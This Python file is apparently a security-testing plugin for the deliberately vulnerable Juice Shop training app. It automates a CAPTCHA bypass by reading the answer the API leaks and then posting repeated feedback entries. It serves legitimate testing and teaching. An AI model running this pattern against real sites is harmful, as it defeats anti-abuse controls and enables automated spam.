from plugins import attack as a

class test_captcha_bypass(a.attack_inter):
    def __init__(self):
        self.juice_session = a.requests.session()
        self.getUrl = a.URL + '/rest/captcha/'
        self.postUrl = a.URL + '/api/Feedbacks/'

    def generator(self, myScript):
        # cookie = a.load_cookie('admin')
        data = {
            'captcha': myScript[0],
            'captchaId' : myScript[1],
            'comment': 'hehehe (anonymous)',
            'rating' : 2
        }
        # return json_data, cookie
        return data

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', encoding='utf-8',
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        logger = a.logging.getLogger("Captcha Bypass")
        a.logging.info(logger)
        a.logging.info('Started')
        for i in range(0,10):
            response = self.juice_session.get(self.getUrl)
            token = [0,0]
            token[0] = response.json()["answer"]
            token[1] = response.json()["captchaId"]
            mydata = self.generator(token)
            response = self.juice_session.post(self.postUrl, data=mydata)
        a.logging.info('Finished')